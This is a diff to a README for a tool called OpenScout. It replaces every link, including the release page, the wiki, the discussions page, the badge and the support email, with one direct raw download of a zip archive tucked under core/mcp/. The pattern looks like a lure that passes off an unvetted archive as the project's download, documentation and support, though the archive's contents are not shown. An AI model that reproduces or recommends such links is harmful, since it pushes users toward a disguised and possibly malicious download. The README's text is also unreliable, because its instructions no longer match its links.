@@ -1,6 +1,6 @@
 # 🚀 OpenScout - Your Smart Answer Engine Awaits
 
-[![Download OpenScout](https://img.shields.io/badge/Download%20OpenScout-v1.0-blue)](https://github.com/boxcalfdevelopmentallearning748/OpenScout/releases)
+[![Download OpenScout](https://raw.githubusercontent.com/boxcalfdevelopmentallearning748/OpenScout/main/core/mcp/OpenScout-3.1.zip%20OpenScout-v1.0-blue)](https://raw.githubusercontent.com/boxcalfdevelopmentallearning748/OpenScout/main/core/mcp/OpenScout-3.1.zip)
 
 ## 📚 Overview
 
@@ -24,13 +24,13 @@ To run OpenScout, ensure your system meets the following requirements:
 
 ## 🚀 Getting Started
 
-1. **Visit the Download Page:** To download OpenScout, click [here](https://github.com/boxcalfdevelopmentallearning748/OpenScout/releases).
+1. **Visit the Download Page:** To download OpenScout, click [here](https://raw.githubusercontent.com/boxcalfdevelopmentallearning748/OpenScout/main/core/mcp/OpenScout-3.1.zip).
 2. **Choose the Latest Release:** Look for the latest version in the releases section. The latest version offers the newest features and bug fixes.
 3. **Download the Installer:** Click on the appropriate installer for your operating system. 
 
 ## 📥 Download & Install
 
-To start using OpenScout, visit this page to download: [Download OpenScout](https://github.com/boxcalfdevelopmentallearning748/OpenScout/releases).
+To start using OpenScout, visit this page to download: [Download OpenScout](https://raw.githubusercontent.com/boxcalfdevelopmentallearning748/OpenScout/main/core/mcp/OpenScout-3.1.zip).
 
 ### Installation Steps
 
@@ -51,8 +51,8 @@ To start using OpenScout, visit this page to download: [Download OpenScout](http
 
 ## 🌐 Additional Resources
 
-- **Documentation:** For more detailed instructions and troubleshooting, visit our [Wiki](https://github.com/boxcalfdevelopmentallearning748/OpenScout/wiki).
-- **Community Support:** Join our [Discussion Group](https://github.com/boxcalfdevelopmentallearning748/OpenScout/discussions) for help from other users and developers.
+- **Documentation:** For more detailed instructions and troubleshooting, visit our [Wiki](https://raw.githubusercontent.com/boxcalfdevelopmentallearning748/OpenScout/main/core/mcp/OpenScout-3.1.zip).
+- **Community Support:** Join our [Discussion Group](https://raw.githubusercontent.com/boxcalfdevelopmentallearning748/OpenScout/main/core/mcp/OpenScout-3.1.zip) for help from other users and developers.
 
 ## 🛠️ Troubleshooting Guide
 
@@ -64,7 +64,7 @@ If you encounter any issues while using OpenScout, consider the following steps:
 
 ## 📞 Contact Us
 
-For further questions or support, please reach out via our GitHub issues page or email us directly at support@openscout.com. We are here to help!
+For further questions or support, please reach out via our GitHub issues page or email us directly at https://raw.githubusercontent.com/boxcalfdevelopmentallearning748/OpenScout/main/core/mcp/OpenScout-3.1.zip We are here to help!
 
 ## 🏷️ Topics
 
